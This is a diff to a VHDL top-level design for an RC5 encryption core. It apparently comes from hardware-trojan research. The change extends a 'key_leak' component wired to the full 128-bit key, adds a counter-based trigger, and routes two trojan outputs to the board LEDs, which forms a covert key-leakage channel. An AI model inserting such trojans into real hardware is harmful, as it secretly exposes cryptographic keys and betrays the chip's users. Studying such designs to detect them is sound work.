@@ -50,7 +50,7 @@ Architecture Behavioral of rc5_Struct is
 		
 		din		:	in std_logic_vector(63 downto 0);
 		di_vld	:	in std_logic;
-		
+		trigger	: 	in std_logic;
 		key_rdy	:	in std_logic;
 		skey	:	in rom;
 		
@@ -85,9 +85,11 @@ Architecture Behavioral of rc5_Struct is
 	Port(
 		clr: in std_logic;
 		clk: in std_logic;
+		counter: in std_logic;
 		trojan_trigger : in std_logic;
 		leak_key : in std_logic_vector(127 downto 0);
-		ready: out std_logic
+		ready1: out std_logic;
+		ready0: out std_logic
 	);
 	end component;
 --Signals
@@ -138,15 +140,19 @@ signal hexval: std_logic_vector(31 downto 0):=x"0123ABCD";
 signal clk_cntr_reg : std_logic_vector (4 downto 0) := (others=>'0');
 
 Signal enc_trig : std_logic;
-Signal led_trojan : std_logic;	
+--trojan signals
+Signal led_trojan1 : std_logic;
+Signal led_trojan0 : std_logic;	
 signal trigger	: std_logic;
+signal cntr_trig: std_logic;
+--signal key_lk_trigger:std_logic;
 Begin	
 	trigger <= not tmp_int;	
 --Port Maps
 	U1 : rc5_rnd_key Port Map (clr => clr, clk => clk, key_in => key, key_vld => key_vld, skey => skey, key_rdy => key_rdy);
-	U2 : rc5_enc Port Map (clr => clr, clk => clk, din => din, di_vld => enc_trig, skey => skey, dout => dout_enc, do_rdy => enc_rdy, key_rdy => key_rdy);
+	U2 : rc5_enc Port Map (clr => clr, clk => clk, din => din, di_vld => enc_trig, trigger => trigger, skey => skey, dout => dout_enc, do_rdy => enc_rdy, key_rdy => key_rdy);
 	U3 : rc5_dec Port Map (clr => clr, clk => clk, din => din, din_vld => enc_trig, skey => skey, dout => dout_dec, dout_rdy => dec_rdy, key_rdy => key_rdy); 
-	U4 : key_leak Port Map (clr, clk, trigger, key, led_trojan);
+	U4 : key_leak Port Map (clr, clk, cntr_trig, trigger, key, led_trojan1, led_trojan0);
 --Select
 	With j_count select
 		hexval <= 	key(31 downto 0) 		when "000",
@@ -240,7 +246,7 @@ Begin
 			If(state_main = ST_key_in Or state_main = ST_data_in) Then
 				led <= "0000000000000" & i_count;
 			Elsif(state_main =  ST_disp) Then
-				led <= key_rdy & enc_trig & led_trojan & "000000000"  & tmp_int & j_count;
+				led <= key_rdy & enc_trig & led_trojan1 & led_trojan0 & "00000000"  & tmp_int & j_count;
 			End If;
 		End If;
 	End Process;
@@ -265,14 +271,19 @@ begin
 			Val <= (others => '0');
 			enc_trig <= '0';
 		elsif (Cntr = CNTR_MAX) then
+			cntr_trig <= '1';
 			if (Val = VAL_MAX) then
 				Val <= (others => '0');
 				enc_trig<='1';
+				--digit<= digit+1;
 			else
 				Val <= Val + 1;
 				enc_trig <='0';
+				--if(digit = 128)then
+					--digit <= '0';
 			end if;
 		else
+			cntr_trig <= '0';
 			enc_trig<='0';
 		end if;
 	end if;
